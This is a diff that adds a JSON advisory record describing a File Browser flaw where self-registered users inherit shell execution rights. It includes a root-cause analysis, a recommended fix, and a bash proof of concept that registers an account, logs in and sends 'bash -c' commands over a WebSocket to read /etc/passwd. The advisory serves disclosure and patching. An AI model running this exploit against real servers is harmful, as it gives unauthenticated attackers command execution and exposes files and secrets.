@@ -1,0 +1,46 @@
+{
+  "id": "GHSA-x8jc-jvqm-pm3f",
+  "modified": "2026-04-01T00:06:59.894127Z",
+  "published": "2026-03-31T23:44:53Z",
+  "aliases": [
+    "CVE-2026-34528"
+  ],
+  "summary": "File Browser's Signup Grants Execution Permissions When Default Permissions Includes Execution",
+  "details": "## Summary\n\nThe `signupHandler` in File Browser applies default user permissions via `d.settings.Defaults.Apply(user)`, then strips only `Admin` (commit `a63573b`). The `Execute` permission and `Commands` list from the default user template are **not** stripped. When an administrator has enabled signup, server-side execution, and set `Execute=true` in the default user template, any unauthenticated user who self-registers inherits shell execution capabilities and can run arbitrary commands on the server.\n\n## Details\n\n### Root Cause\n\n`signupHandler` at `http/auth.go:167–172` applies all default permissions before stripping only `Admin`:\n\n```go\n// http/auth.go\nd.settings.Defaults.Apply(user)   // copies ALL permissions from defaults\n\n// Only Admin is stripped — Execute, Commands are still inherited\nuser.Perm.Admin = false\n// user.Perm.Execute remains true if set in defaults\n// user.Commands remains populated if set in defaults\n```\n\n`settings/defaults.go:31–33` confirms `Apply` copies the full permissions struct including Execute and Commands:\n\n```go\nfunc (d *UserDefaults) Apply(u *users.User) {\n    u.Perm = d.Perm          // includes Execute\n    u.Commands = d.Commands  // includes allowed shell commands\n    // ...\n}\n```\n\nThe `commandsHandler` at `http/commands.go:63–66` checks both the server-wide `EnableExec` flag and `d.user.Perm.Execute`:\n\n```go\nif !d.server.EnableExec || !d.user.Perm.Execute {\n    // writes \"Command not allowed.\" and returns\n}\n```\n\nThe `withUser` middleware reads `d.user` from the database at request time (`http/auth.go:103`), so the persisted `Execute=true` and `Commands` values from signup are authoritative. The command allowlist check at `commands.go:80` passes because the user's `Commands` list contains the inherited default commands:\n\n```go\nif !slices.Contains(d.user.Commands, name) {\n    // writes \"Command not allowed.\" and returns\n}\n```\n\n### Execution Flow\n\n1. Admin configures: `Signup=true`, `EnableExec=true`, `Defaults.Perm.Execute=true`, `Defaults.Commands=[\"bash\"]`\n2. Unauthenticated attacker POSTs to `/api/signup` → new user created with `Execute=true`, `Commands=[\"bash\"]`\n3. Attacker logs in → receives JWT with valid user ID\n4. Attacker opens WebSocket to `/api/command/` → `withUser` fetches user from DB, `Execute=true` passes check\n5. Attacker sends `bash` over WebSocket → `exec.Command(\"bash\")` is invoked → arbitrary shell execution\n\nThis is a direct consequence of the incomplete fix in commit `a63573b` (CVE-2026-32760 / GHSA-5gg9-5g7w-hm73), which applied the same rationale (\"signup users should not inherit privileged defaults\") only to `Admin`, not to `Execute` and `Commands`.\n\n## PoC\n\n```bash\nTARGET=\"http://localhost:8080\"\n\n# Step 1: Self-register (no authentication required)\ncurl -s -X POST \"$TARGET/api/signup\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"attacker\",\"password\":\"AttackerP@ss1!\"}'\n# Returns: 200 OK\n\n# Step 2: Log in and capture token\nTOKEN=$(curl -s -X POST \"$TARGET/api/login\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"attacker\",\"password\":\"AttackerP@ss1!\"}' | tr -d '\"')\n\n# Step 3: Inspect inherited permissions (decode JWT payload)\necho \"$TOKEN\" | cut -d'.' -f2 | base64 -d 2\u003e/dev/null | python3 -m json.tool\n# Expected output (if defaults have Execute=true, Commands=[\"bash\"]):\n# {\n#   \"user\": {\n#     \"perm\": { \"execute\": true, ... },\n#     \"commands\": [\"bash\"],\n#     ...\n#   }\n# }\n\n# Step 4: Execute shell command via WebSocket (requires wscat: npm install -g wscat)\necho '{\"command\":\"bash -c \\\"id \u0026\u0026 hostname \u0026\u0026 cat /etc/passwd | head -3\\\"\"}' | \\\n  wscat --header \"X-Auth: $TOKEN\" \\\n        --connect \"$TARGET/api/command/\" \\\n        --wait 3\n# Expected: uid=... hostname output followed by /etc/passwd lines\n```\n\n## Impact\n\nOn any deployment where an administrator has:\n1. Enabled public self-registration (`signup = true`)\n2. Enabled server-side command execution (`enableExec = true`)\n3. Set `Execute = true` in the default user template\n4. Populated `Commands` with one or more shell commands\n\nAn unauthenticated attacker can self-register and immediately gain the ability to run arbitrary shell commands on the server with the privileges of the File Browser process. All files accessible to the process, environment variables (including secrets), and network interfaces are exposed. This is a complete server compromise for processes running as root, and a significant lateral movement vector otherwise.\n\nThe original `Admin` fix (GHSA-5gg9-5g7w-hm73) demonstrates that the project explicitly recognizes that self-registered users should not inherit privileged defaults. The `Execute` + `Commands` omission is an incomplete application of that principle.\n\n## Recommended Fix\n\nExtend the existing Admin stripping in `http/auth.go` to also clear `Execute` and `Commands` for self-registered users:\n\n```go\n// http/auth.go — after d.settings.Defaults.Apply(user)\n\n// Users signed up via the signup handler should never become admins, even\n// if that is the default permission.\nuser.Perm.Admin = false\n\n// Self-registered users should not inherit execution capabilities from\n// default settings, regardless of what the administrator has configured\n// as the default. Execution rights must be explicitly granted by an admin.\nuser.Perm.Execute = false\nuser.Commands = []string{}\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/filebrowser/filebrowser/v2",
+        "purl": "pkg:golang/github.com/filebrowser/filebrowser/v2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.62.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.62.1",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-x8jc-jvqm-pm3f/GHSA-x8jc-jvqm-pm3f.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/filebrowser/filebrowser/security/advisories/GHSA-x8jc-jvqm-pm3f"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/filebrowser/filebrowser"
+    }
+  ]
+}
